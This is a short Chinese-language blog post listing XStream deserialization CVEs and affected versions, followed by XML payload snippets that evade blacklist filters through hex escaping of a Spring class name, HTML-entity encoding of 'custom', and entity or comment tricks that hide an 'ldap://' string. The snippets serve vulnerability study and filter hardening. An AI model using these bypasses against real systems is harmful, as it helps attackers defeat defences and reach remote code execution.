---
title: "XStream漏洞汇总"
author: ["4shen0ne"]
draft: false
---

| XStream 远程代码执行漏洞 | CVE-2013-7285                                                    | 1.4.x&lt;XStream &lt;= 1.4.6&amp;=1.4.10 |
|------------------|------------------------------------------------------------------|------------------------------------------|
| XStream XXE      | [CVE-2016-3674](https://x-stream.github.io/CVE-2016-3674.html)   | 1.4.x&lt;XStream &lt;= 1.4.8             |
| XStream 远程代码执行漏洞 | CVE-2019-10173                                                   | XStream = 1.4.10                         |
| XStream 远程代码执行漏洞 | [CVE-2020-26217](https://x-stream.github.io/CVE-2020-26217.html) | 1.4.x&lt;XStream &lt;= 1.4.13            |
| XStream 远程代码执行漏洞 | [CVE-2021-21344](https://x-stream.github.io/CVE-2021-21344.html) | 1.4.x&lt;XStream: &lt;= 1.4.15           |
| XStream 远程代码执行漏洞 | [CVE-2021-21345](https://x-stream.github.io/CVE-2021-21345.html) | 1.4.x&lt;XStream: &lt;= 1.4.15           |
| XStream 远程代码执行漏洞 | [CVE-2021-21346](https://x-stream.github.io/CVE-2021-21346.html) | 1.4.x&lt;XStream: &lt;= 1.4.15           |
| XStream 远程代码执行漏洞 | [CVE-2021-21347](https://x-stream.github.io/CVE-2021-21347.html) | 1.4.x&lt;XStream&lt;= 1.4.15             |
| XStream 远程代码执行漏洞 | [CVE-2021-21350](https://x-stream.github.io/CVE-2021-21350.html) | 1.4.x&lt;XStream: &lt;= 1.4.15           |
| XStream 远程代码执行漏洞 | [CVE-2021-21351](https://x-stream.github.io/CVE-2021-21351.html) | 1.4.x&lt;XStream: &lt;= 1.4.15           |
| XStream 远程代码执行漏洞 | [CVE-2021-29505](https://x-stream.github.io/CVE-2021-29505.html) | 1.4.x&lt;XStream: &lt;= 1.4.16           |
| XStream 远程代码执行漏洞 | CVE-2021-39141                                                   | 1.4.x&lt;XStream: &lt;= 1.4.17           |
| XStream 远程代码执行漏洞 | CVE-2021-39144                                                   | 1.4.x&lt;XStream: &lt;= 1.4.17           |
| XStream 远程代码执行漏洞 | CVE-2021-39146                                                   | 1.4.x&lt;XStream: &lt;= 1.4.17           |
| XStream 远程代码执行漏洞 | CVE-2021-39148                                                   | 1.4.x&lt;XStream: &lt;= 1.4.17           |
| XStream 远程代码执行漏洞 | CVE-2021-39152                                                   | 1.4.x&lt;XStream: &lt;= 1.4.17           |
| XStream 远程代码执行漏洞 | CVE-2021-39154                                                   | 1.4.x&lt;XStream: &lt;= 1.4.17           |


## bypass {#bypass}


### 16 进制绕过 {#16-进制绕过}

黑名单为：org[.]springframework
payload:

```xml
<org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
</org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
```


### 针对标签属性内容的绕过 {#针对标签属性内容的绕过}

黑名单：custom
payload:

```xml
<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization="cust&#111;m">
</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
```


### 针对标签内容的绕过 {#针对标签内容的绕过}

黑名单：ldap://
payload:

```xml
1. html 编码
<test>
&#108;dap://xxxxx
</test>

2. 注释
<test>
ld<!-- test -->ap://xxxxx
</test>
```
